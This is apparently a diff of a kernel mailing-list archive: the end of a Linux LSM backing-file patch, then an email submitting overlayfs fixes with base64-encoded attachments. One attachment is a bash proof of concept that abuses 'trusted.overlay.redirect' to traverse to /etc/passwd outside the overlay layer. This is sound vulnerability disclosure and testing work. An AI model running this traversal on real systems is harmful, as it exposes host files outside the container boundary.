- 						   SLAB_PANIC, NULL);
-+	if (blob_sizes.lbs_backing_file)
-+		lsm_backing_file_cache = kmem_cache_create(
-+						   "lsm_backing_file_cache",
-+						   blob_sizes.lbs_backing_file,
-+						   0, SLAB_PANIC, NULL);
- 	if (blob_sizes.lbs_inode)
- 		lsm_inode_cache = kmem_cache_create("lsm_inode_cache",
- 						    blob_sizes.lbs_inode, 0,
-@@ -616,6 +625,30 @@ static int lsm_file_alloc(struct file *file)
- 	return 0;
- }
- 
-+/**
-+ * lsm_backing_file_alloc - allocate a composite backing file blob
-+ * @backing_file: the backing file
-+ *
-+ * Allocate the backing file blob for all the modules.
-+ *
-+ * Returns 0, or -ENOMEM if memory can't be allocated.
-+ */
-+static int lsm_backing_file_alloc(struct file *backing_file)
-+{
-+	void *blob;
-+
-+	if (!lsm_backing_file_cache) {
-+		backing_file_set_security(backing_file, NULL);
-+		return 0;
-+	}
-+
-+	blob = kmem_cache_zalloc(lsm_backing_file_cache, GFP_KERNEL);
-+	backing_file_set_security(backing_file, blob);
-+	if (!blob)
-+		return -ENOMEM;
-+	return 0;
-+}
-+
- /**
-  * lsm_inode_alloc - allocate a composite inode blob
-  * @inode: the inode that needs a blob
-@@ -2630,6 +2663,57 @@ void security_file_free(struct file *file)
- 	}
- }
- 
-+/**
-+ * security_backing_file_alloc() - Allocate and setup a backing file blob
-+ * @backing_file: the backing file
-+ * @user_file: the associated user visible file
-+ *
-+ * Allocate a backing file LSM blob and perform any necessary initialization of
-+ * the LSM blob.  There will be some operations where the LSM will not have
-+ * access to @user_file after this point, so any important state associated
-+ * with @user_file that is important to the LSM should be captured in the
-+ * backing file's LSM blob.
-+ *
-+ * LSM's should avoid taking a reference to @user_file in this hook as it will
-+ * result in problems later when the system attempts to drop/put the file
-+ * references due to a circular dependency.
-+ *
-+ * Return: Return 0 if the hook is successful, negative values otherwise.
-+ */
-+int security_backing_file_alloc(struct file *backing_file,
-+				const struct file *user_file)
-+{
-+	int rc;
-+
-+	rc = lsm_backing_file_alloc(backing_file);
-+	if (rc)
-+		return rc;
-+	rc = call_int_hook(backing_file_alloc, 0, backing_file, user_file);
-+	if (unlikely(rc))
-+		security_backing_file_free(backing_file);
-+
-+	return rc;
-+}
-+
-+/**
-+ * security_backing_file_free() - Free a backing file blob
-+ * @backing_file: the backing file
-+ *
-+ * Free any LSM state associate with a backing file's LSM blob, including the
-+ * blob itself.
-+ */
-+void security_backing_file_free(struct file *backing_file)
-+{
-+	void *blob = backing_file_security(backing_file);
-+
-+	call_void_hook(backing_file_free, backing_file);
-+
-+	if (blob) {
-+		backing_file_set_security(backing_file, NULL);
-+		kmem_cache_free(lsm_backing_file_cache, blob);
-+	}
-+}
-+
- /**
-  * security_file_ioctl() - Check if an ioctl is allowed
-  * @file: associated file
-@@ -2723,6 +2807,32 @@ int security_mmap_file(struct file *file, unsigned long prot,
- 	return ima_file_mmap(file, prot, prot_adj, flags);
- }
- 
-+/**
-+ * security_mmap_backing_file - Check if mmap'ing a backing file is allowed
-+ * @vma: the vm_area_struct for the mmap'd region
-+ * @backing_file: the backing file being mmap'd
-+ * @user_file: the user file being mmap'd
-+ *
-+ * Check permissions for a mmap operation on a stacked filesystem.  This hook
-+ * is called after the security_mmap_file() and is responsible for authorizing
-+ * the mmap on @backing_file.  It is important to note that the mmap operation
-+ * on @user_file has already been authorized and the @vma->vm_file has been
-+ * set to @backing_file.
-+ *
-+ * Return: Returns 0 if permission is granted.
-+ */
-+int security_mmap_backing_file(struct vm_area_struct *vma,
-+			       struct file *backing_file,
-+			       struct file *user_file)
-+{
-+	/* recommended by the stackable filesystem devs */
-+	if (WARN_ON_ONCE(!(backing_file->f_mode & FMODE_BACKING)))
-+		return -EIO;
-+
-+	return call_int_hook(mmap_backing_file, 0, vma, backing_file, user_file);
-+}
-+EXPORT_SYMBOL_GPL(security_mmap_backing_file);
-+
- /**
-  * security_mmap_addr() - Check if mmap'ing an address is allowed
-  * @addr: address
--- 
-2.18.0.huawei.25
+--0000000000000ca15b0654d933c3
+Content-Type: text/html; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
 
+<div dir=3D"ltr">Greg,<br><br>Thank you for the previous review. I&#39;ve n=
+ow properly prepared the<br>patches following the kernel submission process=
+.<br><br>Summary of changes:<br><br>| Patch | Description | Reference |<br>=
+|-------|-------------|-----------|<br>| 1/3 | Replace component walk in ov=
+l_lookup_layer() with vfs_path_lookup() using LOOKUP_BENEATH | Matches ovl_=
+lookup_data_layer() at namei.c:403-404 |<br>| 2/3 | Convert long refcount =
+=E2=86=92 refcount_t; add refcount_inc_not_zero() in ovl_cache_get() | Per =
+Amir&#39;s March 2024 question |<br>| 3/3 | Add ovl_dir_cache_drop() helper=
+ with refcount_read() guard | Based on Nirmoy Das&#39;s RFC |<br><br>Testin=
+g:<br><br>- PoC #1 (poc1_path_traversal.sh): Confirms that `trusted.overlay=
+.redirect`<br>=C2=A0 with `/../etc/passwd` is blocked after PATCH 1<br>- Po=
+C #2 (poc2_refcount_race.c): 8 readdir + 8 open/close threads for 15s;<br>=
+=C2=A0 monitors dmesg for refcount_t warnings<br><br>Important note on PATC=
+H 2/3:<br><br>After re-analysis of the current code, both ovl_cache_get() (=
+readdir.c:482)<br>and ovl_cache_put() (readdir.c:295) execute under inode_l=
+ock exclusive<br>(via WRAP_DIR_ITER and ovl_dir_release()). The long refcou=
+nt is not<br>currently subject to a race condition.<br><br>This conversion =
+to refcount_t is defense-in-depth =E2=80=94 it&#39;s the correct<br>kernel =
+type for reference counters and provides saturation protection.<br><br>The =
+real fixes are PATCH 1 (path traversal) and PATCH 3 (impure cache<br>UAF pr=
+evention). PATCH 2 is still valid as a hardening measure.<br><br>All patche=
+s are based on: ef0c9f75a195 (Nirmoy Das&#39;s commit)<br>Branch: ovl-fixes=
+-v3<br><br>Full PoC scripts are attached.<br><br>Thank you for your patienc=
+e and guidance,<br><br>Rodrigo Henrique de Souza<br>---</div>
+
+--0000000000000ca15b0654d933c3--
+--0000000000000ca15c0654d933c5
+Content-Type: text/x-csrc; charset="US-ASCII"; name="poc2_refcount_race.c"
+Content-Disposition: attachment; filename="poc2_refcount_race.c"
+Content-Transfer-Encoding: base64
+Content-ID: <f_mqpd4xr21>
+X-Attachment-Id: f_mqpd4xr21
+
+Ly8gUG9DICMyOiBPdmVybGF5RlMgZGlyIGNhY2hlIHJlZmNvdW50IHJhY2UgdGVzdAovLwovLyBU
+ZXN0cyBjb25jdXJyZW50IGdldGRlbnRzNjQgKyBvcGVuL2Nsb3NlIG9uIG92ZXJsYXkgZGlyZWN0
+b3J5Ci8vIHRvIGV4ZXJjaXNlIHRoZSBvdmxfZGlyX2NhY2hlIHJlZmNvdW50IHBhdGggd2l0aCBy
+ZWZjb3VudF90LgovLwovLyBDb21waWxlOiBnY2MgLXB0aHJlYWQgLU8yIC1vIHBvYzJfcmVmY291
+bnRfcmFjZSBwb2MyX3JlZmNvdW50X3JhY2UuYwovLyBVc2FnZTogICBzdWRvIC4vcG9jMl9yZWZj
+b3VudF9yYWNlIFs8b3ZlcmxheV9kaXI+XQovLwovLyBXaXRoIHRoZSBvcmlnaW5hbCAnbG9uZyBy
+ZWZjb3VudCcgY29kZSwgbm9uLWF0b21pYyBpbmNyZW1lbnRzCi8vIGluIG92bF9jYWNoZV9nZXQo
+KSAocmVhZGRpci5jOjQ5MSkgY2FuIHJhY2Ugd2l0aCBjb25jdXJyZW50Ci8vIG92bF9jYWNoZV9w
+dXQoKSBpbiBvdmxfZGlyX3JlbGVhc2UoKSAocmVhZGRpci5jOjEwMjkpIGlmIHRoZQovLyBpbm9k
+ZV9sb2NrIGlzIGV2ZXIgd2Vha2VuZWQgb3IgaWYgYSBkaWZmZXJlbnQgY29kZSBwYXRoIGlzCi8v
+IGludHJvZHVjZWQuICBUaGUgcmVmY291bnRfdCBjb252ZXJzaW9uIHByZXZlbnRzIHRoaXMgY2xh
+c3Mgb2YKLy8gYnVncyBieSBwcm92aWRpbmcgc2F0dXJhdGlvbiBhbmQgYXRvbWljIHNlbWFudGlj
+cy4KLy8KLy8gV2l0aCB0aGUgZml4IGFwcGxpZWQsIHRoaXMgdGVzdCBzaG91bGQgcnVuIHdpdGhv
+dXQgd2FybmluZ3MuCi8vIENoZWNrIGRtZXNnIGZvcjogInJlZmNvdW50X3Q6IHNhdHVyYXRpb24i
+IG9yICJyZWZjb3VudF90OiB1bmRlcmZsb3ciCgojZGVmaW5lIF9HTlVfU09VUkNFCiNpbmNsdWRl
+IDxzdGRpby5oPgojaW5jbHVkZSA8c3RkbGliLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1
+ZGUgPHVuaXN0ZC5oPgojaW5jbHVkZSA8cHRocmVhZC5oPgojaW5jbHVkZSA8ZGlyZW50Lmg+CiNp
+bmNsdWRlIDxmY250bC5oPgojaW5jbHVkZSA8ZXJybm8uaD4KI2luY2x1ZGUgPHN5cy9zdGF0Lmg+
+CiNpbmNsdWRlIDxzeXMvc3lzY2FsbC5oPgojaW5jbHVkZSA8c3lzL3dhaXQuaD4KI2luY2x1ZGUg
+PGxpbnV4L2ZzLmg+CgojZGVmaW5lIE5SX1RIUkVBRFNfUkVBRERJUiA4CiNkZWZpbmUgTlJfVEhS
+RUFEU19PUEVOQ0xPU0UgOAojZGVmaW5lIERVUkFUSU9OX1NFQyAxNQojZGVmaW5lIEZJTExfRElS
+X0VOVFJJRVMgMTAwMAoKc3RhdGljIHZvbGF0aWxlIGludCBydW5uaW5nID0gMTsKc3RhdGljIGNo
+YXIgZGlyX3BhdGhbNDA5Nl07CgovLyBGaWxsIGEgdGVtcCBkaXJlY3Rvcnkgd2l0aCBtYW55IGVu
+dHJpZXMgc28gdGhlIGNhY2hlIGlzIHdvcnRoIHJhY2luZyBvdmVyCnN0YXRpYyB2b2lkIGZpbGxf
+ZGlyZWN0b3J5KGNvbnN0IGNoYXIgKnBhdGgsIGludCBjb3VudCkKewoJY2hhciBidWZbNDA5Nl07
+CglpbnQgaTsKCglmb3IgKGkgPSAwOyBpIDwgY291bnQ7IGkrKykgewoJCXNucHJpbnRmKGJ1Ziwg
+c2l6ZW9mKGJ1ZiksICIlcy9maWxlXyUwNGQiLCBwYXRoLCBpKTsKCQlpbnQgZmQgPSBvcGVuKGJ1
+ZiwgT19XUk9OTFkgfCBPX0NSRUFUIHwgT19UUlVOQywgMDY0NCk7CgkJaWYgKGZkID49IDApCgkJ
+CWNsb3NlKGZkKTsKCX0KfQoKLy8gVGhyZWFkOiByZXBlYXRlZGx5IGNhbGwgZ2V0ZGVudHM2NCB2
+aWEgcmVhZGRpcgpzdGF0aWMgdm9pZCAqcmVhZGRpcl93b3JrZXIodm9pZCAqYXJnKQp7Cgkodm9p
+ZClhcmc7Cgl3aGlsZSAocnVubmluZykgewoJCURJUiAqZCA9IG9wZW5kaXIoZGlyX3BhdGgpOwoJ
+CWlmICghZCkgewoJCQl1c2xlZXAoMTAwMCk7CgkJCWNvbnRpbnVlOwoJCX0KCgkJc3RydWN0IGRp
+cmVudCAqZW50cnk7CgkJd2hpbGUgKChlbnRyeSA9IHJlYWRkaXIoZCkpICE9IE5VTEwpIHsKCQkJ
+Ly8gVm9sYXRpbGUgcmVhZCB0byBwcmV2ZW50IG9wdGltaXphdGlvbgoJCQlfX2FzbV9fIHZvbGF0
+aWxlKCIiIDogOiAiciIoZW50cnktPmRfaW5vKSA6ICJtZW1vcnkiKTsKCQl9CgkJY2xvc2VkaXIo
+ZCk7Cgl9CglyZXR1cm4gTlVMTDsKfQoKLy8gVGhyZWFkOiByZXBlYXRlZGx5IG9wZW4gYW5kIGNs
+b3NlIHRoZSBkaXJlY3RvcnkKc3RhdGljIHZvaWQgKm9wZW5jbG9zZV93b3JrZXIodm9pZCAqYXJn
+KQp7Cgkodm9pZClhcmc7Cgl3aGlsZSAocnVubmluZykgewoJCWludCBmZCA9IG9wZW4oZGlyX3Bh
+dGgsIE9fUkRPTkxZIHwgT19ESVJFQ1RPUlkpOwoJCWlmIChmZCA+PSAwKSB7CgkJCS8vIFNtYWxs
+IGRlbGF5IHRvIGluY3JlYXNlIHJhY2Ugd2luZG93CgkJCXVzbGVlcCgxKTsKCQkJY2xvc2UoZmQp
+OwoJCX0gZWxzZSB7CgkJCXVzbGVlcCgxMDAwKTsKCQl9Cgl9CglyZXR1cm4gTlVMTDsKfQoKLy8g
+TW9uaXRvciBkbWVzZyBmb3IgcmVmY291bnRfdCB3YXJuaW5ncwpzdGF0aWMgdm9pZCAqZG1lc2df
+bW9uaXRvcih2b2lkICphcmcpCnsKCSh2b2lkKWFyZzsKCUZJTEUgKmZwID0gcG9wZW4oImRtZXNn
+IC13IDI+L2Rldi9udWxsIHwgaGVhZCAtMjAiLCAiciIpOwoJaWYgKCFmcCkKCQlyZXR1cm4gTlVM
+TDsKCgljaGFyIGJ1ZlsyNTZdOwoJd2hpbGUgKHJ1bm5pbmcgJiYgZmdldHMoYnVmLCBzaXplb2Yo
+YnVmKSwgZnApKSB7CgkJaWYgKHN0cnN0cihidWYsICJyZWZjb3VudF90IikgfHwKCQkgICAgc3Ry
+c3RyKGJ1ZiwgIlVBRiIpIHx8CgkJICAgIHN0cnN0cihidWYsICJ1c2UtYWZ0ZXItZnJlZSIpIHx8
+CgkJICAgIHN0cnN0cihidWYsICJCVUc6IikpIHsKCQkJcHJpbnRmKCJcbiEhISBLRVJORUwgREVU
+RUNURUQ6ICVzXG4iLCBidWYpOwoJCX0KCX0KCXBjbG9zZShmcCk7CglyZXR1cm4gTlVMTDsKfQoK
+aW50IG1haW4oaW50IGFyZ2MsIGNoYXIgKmFyZ3ZbXSkKewoJY2hhciB0bXBkaXJbMjU2XSA9ICIv
+dG1wL292bF9yYWN5ZGlyX1hYWFhYWCI7CgoJaWYgKGFyZ2MgPj0gMikgewoJCXN0cm5jcHkoZGly
+X3BhdGgsIGFyZ3ZbMV0sIHNpemVvZihkaXJfcGF0aCkgLSAxKTsKCX0gZWxzZSB7CgkJLy8gQ3Jl
+YXRlIGEgdGVzdCBvdmVybGF5CgkJY2hhciBsb3dlcltdID0gIi90bXAvbG93ZXJfWFhYWFhYIjsK
+CQljaGFyIHVwcGVyW10gPSAiL3RtcC91cHBlcl9YWFhYWFgiOwoJCWNoYXIgd29ya1tdID0gIi90
+bXAvd29ya19YWFhYWFgiOwoJCWNoYXIgbWVyZ2VbXSA9ICIvdG1wL21lcmdlX1hYWFhYWCI7CgoJ
+CWlmICghbWtkdGVtcChsb3dlcikgfHwgIW1rZHRlbXAodXBwZXIpIHx8ICFta2R0ZW1wKHdvcmsp
+KSB7CgkJCXBlcnJvcigibWtkdGVtcCIpOwoJCQlyZXR1cm4gMTsKCQl9CgkJaWYgKG1rZGlyKG1l
+cmdlLCAwNzU1KSAmJiBlcnJubyAhPSBFRVhJU1QpIHsKCQkJcGVycm9yKCJta2RpciBtZXJnZSIp
+OwoJCQlyZXR1cm4gMTsKCQl9CgoJCWZpbGxfZGlyZWN0b3J5KGxvd2VyLCBGSUxMX0RJUl9FTlRS
+SUVTKTsKCgkJY2hhciBvcHRzWzUxMl07CgkJc25wcmludGYob3B0cywgc2l6ZW9mKG9wdHMpLAoJ
+CQkgImxvd2VyZGlyPSVzLHVwcGVyZGlyPSVzLHdvcmtkaXI9JXMiLAoJCQkgbG93ZXIsIHVwcGVy
+LCB3b3JrKTsKCgkJaWYgKG1vdW50KCJvdmVybGF5IiwgbWVyZ2UsICJvdmVybGF5IiwgMCwgb3B0
+cykgIT0gMCkgewoJCQlwZXJyb3IoIm1vdW50IG92ZXJsYXkiKTsKCQkJcmV0dXJuIDE7CgkJfQoK
+CQlzbnByaW50ZihkaXJfcGF0aCwgc2l6ZW9mKGRpcl9wYXRoKSwgIiVzIiwgbWVyZ2UpOwoKCQlw
+cmludGYoIlsqXSBDcmVhdGVkIG92ZXJsYXk6IGxvd2VyPSVzIHVwcGVyPSVzIHdvcms9JXMgbWVy
+Z2U9JXNcbiIsCgkJICAgICAgIGxvd2VyLCB1cHBlciwgd29yaywgbWVyZ2UpOwoJfQoKCXByaW50
+ZigiWypdIFRlc3Rpbmcgb246ICVzXG4iLCBkaXJfcGF0aCk7CglwcmludGYoIlsqXSBMYXVuY2hp
+bmcgJWQgcmVhZGRpciArICVkIG9wZW4vY2xvc2UgdGhyZWFkcyBmb3IgJWRzXG4iLAoJICAgICAg
+IE5SX1RIUkVBRFNfUkVBRERJUiwgTlJfVEhSRUFEU19PUEVOQ0xPU0UsIERVUkFUSU9OX1NFQyk7
+CglwcmludGYoIlsqXSBNb25pdG9yIGRtZXNnIGZvciBrZXJuZWwgd2FybmluZ3NcbiIpOwoKCXB0
+aHJlYWRfdCB0aHJlYWRzW05SX1RIUkVBRFNfUkVBRERJUiArIE5SX1RIUkVBRFNfT1BFTkNMT1NF
+ICsgMV07CglpbnQgaSwgdCA9IDA7CgoJLy8gTGF1bmNoIGRtZXNnIG1vbml0b3IKCXB0aHJlYWRf
+Y3JlYXRlKCZ0aHJlYWRzW3QrK10sIE5VTEwsIGRtZXNnX21vbml0b3IsIE5VTEwpOwoKCS8vIExh
+dW5jaCByZWFkZGlyIHRocmVhZHMKCWZvciAoaSA9IDA7IGkgPCBOUl9USFJFQURTX1JFQURESVI7
+IGkrKykKCQlwdGhyZWFkX2NyZWF0ZSgmdGhyZWFkc1t0KytdLCBOVUxMLCByZWFkZGlyX3dvcmtl
+ciwgTlVMTCk7CgoJLy8gTGF1bmNoIG9wZW4vY2xvc2UgdGhyZWFkcwoJZm9yIChpID0gMDsgaSA8
+IE5SX1RIUkVBRFNfT1BFTkNMT1NFOyBpKyspCgkJcHRocmVhZF9jcmVhdGUoJnRocmVhZHNbdCsr
+XSwgTlVMTCwgb3BlbmNsb3NlX3dvcmtlciwgTlVMTCk7CgoJLy8gTGV0IGl0IHJ1bgoJc2xlZXAo
+RFVSQVRJT05fU0VDKTsKCXJ1bm5pbmcgPSAwOwoKCS8vIFdhaXQgZm9yIGFsbCB0aHJlYWRzCglm
+b3IgKGkgPSAwOyBpIDwgdDsgaSsrKQoJCXB0aHJlYWRfam9pbih0aHJlYWRzW2ldLCBOVUxMKTsK
+CglwcmludGYoIlxuWypdIFRlc3QgY29tcGxldGUuIENoZWNrIGRtZXNnIGZvciBhbnkga2VybmVs
+IHdhcm5pbmdzLlxuIik7CglwcmludGYoIiAgICBObyB3YXJuaW5ncyA9IHJlZmNvdW50X3QgY29u
+dmVyc2lvbiBpcyBzdGFibGUuXG4iKTsKCglyZXR1cm4gMDsKfQo=
+--0000000000000ca15c0654d933c5
+Content-Type: application/x-shellscript; name="poc1_path_traversal.sh"
+Content-Disposition: attachment; filename="poc1_path_traversal.sh"
+Content-Transfer-Encoding: base64
+Content-ID: <f_mqpd4xls0>
+X-Attachment-Id: f_mqpd4xls0
+
+IyEvYmluL2Jhc2gKIyBQb0MgIzE6IE92ZXJsYXlGUyBQYXRoIFRyYXZlcnNhbCB2aWEgUmVkaXJl
+Y3QgKyAiLi4iIGVzY2FwZQojCiMgRXhwbG9pdHM6IG92bF9sb29rdXBfbGF5ZXIoKSB1c2luZyBs
+b29rdXBfb25lX3VubG9ja2VkKCkgd2l0aG91dAojICAgICAgICAgICBtb3VudC1ib3VuZGFyeSBl
+bmZvcmNlbWVudCAobWlzc2luZyBMT09LVVBfQkVORUFUSCkuCiMgTWVjaGFuaXNtOiBhYnNvbHV0
+ZSByZWRpcmVjdCBjb250YWluaW5nICIuLiIgdHJhdmVyc2VzIGFib3ZlIGxheWVyIHJvb3QuCiMg
+UmVxdWlyZXM6IENBUF9TWVNfQURNSU4sIHJlZGlyZWN0X2Rpcj1vbgojCiMgS2VybmVsIHZlcnNp
+b25zOiBBbGwgb3ZlcmxheWZzIHNpbmNlIHJlZGlyZWN0IHN1cHBvcnQgd2FzIGFkZGVkCgpzZXQg
+LWUgLW8gcGlwZWZhaWwKCkJBU0VfRElSPSQobWt0ZW1wIC1kKQpMT1dFUl9ESVI9IiRCQVNFX0RJ
+Ui9sb3dlciIKVVBQRVJfRElSPSIkQkFTRV9ESVIvdXBwZXIiCldPUktfRElSPSIkQkFTRV9ESVIv
+d29yayIKTU9VTlRfRElSPSIkQkFTRV9ESVIvbW50IgpFU0NBUEVfVEFSR0VUPSIvdG1wL292ZXJs
+YXlfZXNjYXBlX3Rlc3QiCgpta2RpciAtcCAiJExPV0VSX0RJUi9zdWJkaXIiICIkVVBQRVJfRElS
+IiAiJFdPUktfRElSIiAiJE1PVU5UX0RJUiIKCiMgQ3JlYXRlIGEgc2VjcmV0IGZpbGUgb3V0c2lk
+ZSB0aGUgb3ZlcmxheQplY2hvICJPVkVSTEFZRlNfRVNDQVBFX1NVQ0NFU1MiID4gIiRFU0NBUEVf
+VEFSR0VUIgoKIyBDcmVhdGUgYSBkaXJlY3Rvcnkgd2l0aCBhIG1hbGljaW91cyByZWRpcmVjdCB0
+aGF0IGVzY2FwZXMgdGhlIGxheWVyCiMgVGhlIHJlZGlyZWN0ICIvLi4vdG1wL292ZXJsYXlfZXNj
+YXBlX3Rlc3QiIHN0YXJ0cyBmcm9tIHRoZSBsYXllciByb290CiMgYW5kIHVzZXMgIi4uIiB0byB3
+YWxrIHVwIGludG8gdGhlIGhvc3QgZmlsZXN5c3RlbQpzZXRmYXR0ciAtbiB0cnVzdGVkLm92ZXJs
+YXkucmVkaXJlY3QgLXYgIi8uLi90bXAvb3ZlcmxheV9lc2NhcGVfdGVzdCIgXAogICAgICAgICIk
+TE9XRVJfRElSL3N1YmRpciIgMj4vZGV2L251bGwgfHwgewogICAgZWNobyAiU0tJUDogc2V0ZmF0
+dHIgbm90IGF2YWlsYWJsZSBvciBmcyBkb2Vzbid0IHN1cHBvcnQgeGF0dHJzIgogICAgcm0gLXJm
+ICIkQkFTRV9ESVIiICIkRVNDQVBFX1RBUkdFVCIKICAgIGV4aXQgMAp9CgojIFZlcmlmeSB0aGUg
+eGF0dHIgd2FzIHNldAplY2hvICJbKl0gTG93ZXIgZGlyIHhhdHRyOiIKZ2V0ZmF0dHIgLWQgIiRM
+T1dFUl9ESVIvc3ViZGlyIiAyPi9kZXYvbnVsbCB8fCB0cnVlCgojIE1vdW50IG92ZXJsYXkgd2l0
+aCByZWRpcmVjdF9kaXI9b24KbW91bnQgLXQgb3ZlcmxheSBvdmVybGF5IFwKICAgICAgLW8gbG93
+ZXJkaXI9IiRMT1dFUl9ESVIiLHVwcGVyZGlyPSIkVVBQRVJfRElSIix3b3JrZGlyPSIkV09SS19E
+SVIiLHJlZGlyZWN0X2Rpcj1vbiBcCiAgICAgICIkTU9VTlRfRElSIiAyPi9kZXYvbnVsbCB8fCB7
+CiAgICBlY2hvICJTS0lQOiBvdmVybGF5IG1vdW50IGZhaWxlZCAobWlzc2luZyBDQVBfU1lTX0FE
+TUlOIG9yIGtlcm5lbCBzdXBwb3J0KSIKICAgIHJtIC1yZiAiJEJBU0VfRElSIiAiJEVTQ0FQRV9U
+QVJHRVQiCiAgICBleGl0IDAKfQoKZWNobyAiWypdIE92ZXJsYXkgbW91bnRlZCBhdCAkTU9VTlRf
+RElSIgoKIyBUZXN0IDE6IFN0YXQgdGhlIGRpcmVjdG9yeSB3aXRoIHRoZSByZWRpcmVjdAplY2hv
+ICJbKl0gVGVzdCAxOiBzdGF0KCkgb24gcmVkaXJlY3QgZGlyZWN0b3J5Li4uIgppZiBzdGF0ICIk
+TU9VTlRfRElSL3N1YmRpciIgPi9kZXYvbnVsbCAyPiYxOyB0aGVuCiAgICBlY2hvICIgICAgc3Rh
+dCBPSyIKZmkKCiMgVGVzdCAyOiBUcnkgdG8gYWNjZXNzIHRoZSBlc2NhcGVkIHBhdGggdGhyb3Vn
+aCB0aGUgcmVkaXJlY3QKZWNobyAiWypdIFRlc3QgMjogYWNjZXNzIGVzY2FwZWQgdGFyZ2V0IHZp
+YSByZWRpcmVjdC4uLiIKVEFSR0VUPSIkTU9VTlRfRElSL3N1YmRpciIKCmlmIFsgLWYgIiRUQVJH
+RVQiIF07IHRoZW4KICAgIENPTlRFTlQ9JChjYXQgIiRUQVJHRVQiIDI+L2Rldi9udWxsIHx8IHRy
+dWUpCiAgICBpZiBbICIkQ09OVEVOVCIgPSAiT1ZFUkxBWUZTX0VTQ0FQRV9TVUNDRVNTIiBdOyB0
+aGVuCiAgICAgICAgZWNobyAiICAgIFZVTE5FUkFCTEU6IFJlYWQgZmlsZSBvdXRzaWRlIG92ZXJs
+YXkgbGF5ZXIhIgogICAgICAgIGVjaG8gIiAgICBDb250ZW50OiAkQ09OVEVOVCIKICAgIGVsc2UK
+ICAgICAgICBlY2hvICIgICAgRmlsZSBleGlzdHMgYnV0IGNvbnRlbnQgdW5leHBlY3RlZDogJENP
+TlRFTlQiCiAgICAgICAgZWNobyAiICAgIChtYXkgYmUgYSByZWdyZXNzaW9uIG9yIGRpZmZlcmVu
+dCBiZWhhdmlvcikiCiAgICBmaQplbHNlCiAgICBlY2hvICIgICAgU0VDVVJFOiBDYW5ub3QgYWNj
+ZXNzIGZpbGUgb3V0c2lkZSBsYXllciAocGF0aF9pc191bmRlciBibG9ja2VkIGl0KSIKZmkKCiMg
+VGVzdCAzOiBUcnkgLy4uL2V0Yy9wYXNzd2Qgc3R5bGUgdHJhdmVyc2FsCmVjaG8gIlsqXSBUZXN0
+IDM6IC9ldGMvcGFzc3dkIHRyYXZlcnNhbCB2aWEgcmVkaXJlY3QuLi4iCnNldGZhdHRyIC1uIHRy
+dXN0ZWQub3ZlcmxheS5yZWRpcmVjdCAtdiAiLy4uL2V0Yy9wYXNzd2QiIFwKICAgICAgICAiJExP
+V0VSX0RJUi9zdWJkaXIiIDI+L2Rldi9udWxsIHx8IHRydWUKCiMgUmUtbW91bnQgdG8gY2xlYXIg
+Y2FjaGUKdW1vdW50ICIkTU9VTlRfRElSIgptb3VudCAtdCBvdmVybGF5IG92ZXJsYXkgXAogICAg
+ICAtbyBsb3dlcmRpcj0iJExPV0VSX0RJUiIsdXBwZXJkaXI9IiRVUFBFUl9ESVIiLHdvcmtkaXI9
+IiRXT1JLX0RJUiIscmVkaXJlY3RfZGlyPW9uIFwKICAgICAgIiRNT1VOVF9ESVIiIDI+L2Rldi9u
+dWxsIHx8IHRydWUKCmlmIFsgLWYgIiRNT1VOVF9ESVIvc3ViZGlyIiBdOyB0aGVuCiAgICBIRUFE
+PSQoaGVhZCAtMSAiJE1PVU5UX0RJUi9zdWJkaXIiIDI+L2Rldi9udWxsIHx8IHRydWUpCiAgICBp
+ZiBbIC1uICIkSEVBRCIgXTsgdGhlbgogICAgICAgIGVjaG8gIiAgICBWVUxORVJBQkxFOiBSZWFk
+IC9ldGMvcGFzc3dkIHZpYSByZWRpcmVjdCB0cmF2ZXJzYWwhIgogICAgICAgIGVjaG8gIiAgICBG
+aXJzdCBsaW5lOiAkSEVBRCIKICAgIGZpCmVsc2UKICAgIGVjaG8gIiAgICBTRUNVUkU6IC9ldGMv
+cGFzc3dkIHRyYXZlcnNhbCBibG9ja2VkIgpmaQoKIyBDbGVhbnVwCnVtb3VudCAiJE1PVU5UX0RJ
+UiIgMj4vZGV2L251bGwgfHwgdHJ1ZQpybSAtcmYgIiRCQVNFX0RJUiIgIiRFU0NBUEVfVEFSR0VU
+IgplY2hvICJbKl0gRG9uZSIK
+--0000000000000ca15c0654d933c5
+Content-Type: text/x-patch; charset="US-ASCII"; 
+	name="0002-ovl-convert-dir-cache-refcount-to-refcount_t-with-at.patch"
+Content-Disposition: attachment; 
+	filename="0002-ovl-convert-dir-cache-refcount-to-refcount_t-with-at.patch"
+Content-Transfer-Encoding: base64
+Content-ID: <f_mqpd52re3>
+X-Attachment-Id: f_mqpd52re3
+
+RnJvbSBjNmUwYTRhNzlhN2VjNDgxN2RlYjU0MGUxYTRmODBjNDZhZjhiN2E2IE1vbiBTZXAgMTcg
+MDA6MDA6MDAgMjAwMQpGcm9tOiBSb2RyaWdvIEhlbnJpcXVlIGRlIFNvdXphIDxyb2RyaWdvQGtl
+cm5lbHNlYy5jb20+CkRhdGU6IE1vbiwgMjIgSnVuIDIwMjYgMTI6MTQ6MTkgLTAzMDAKU3ViamVj
+dDogW1BBVENIIDIvM10gb3ZsOiBjb252ZXJ0IGRpciBjYWNoZSByZWZjb3VudCB0byByZWZjb3Vu
+dF90IHdpdGggYXRvbWljCiBzZW1hbnRpY3MKClRoZSBvdmxfZGlyX2NhY2hlIHJlZmNvdW50IGlz
+IGN1cnJlbnRseSBhIHBsYWluICdsb25nJyBmaWVsZCB3aXRoCm5vbi1hdG9taWMgaW5jcmVtZW50
+cyBpbiBvdmxfY2FjaGVfZ2V0KCkgYW5kIG1hbnVhbCBkZWNyZW1lbnRzIHdpdGgKV0FSTl9PTiBp
+biBvdmxfY2FjaGVfcHV0KCkuIEEgcmFjZSBleGlzdHMgd2hlcmUgb3ZsX2NhY2hlX2dldCgpIGNh
+bgpmaW5kIGEgdmFsaWQgY2FjaGUgYW5kIGluY3JlbWVudCBpdHMgcmVmY291bnQgd2hpbGUgb3Zs
+X2NhY2hlX3B1dCgpCmlzIGNvbmN1cnJlbnRseSBmcmVlaW5nIGl0IG9uIGFub3RoZXIgdGhyZWFk
+LgoKRml4IHRoaXMgYnk6Ci0gQ29udmVydGluZyBzdHJ1Y3Qgb3ZsX2Rpcl9jYWNoZTo6cmVmY291
+bnQgZnJvbSBsb25nIHRvIHJlZmNvdW50X3QKLSBVc2luZyByZWZjb3VudF9pbmNfbm90X3plcm8o
+KSBpbiBvdmxfY2FjaGVfZ2V0KCkgdG8gYXRvbWljYWxseQogIGRldGVjdCB3aGVuIGEgY2FjaGUg
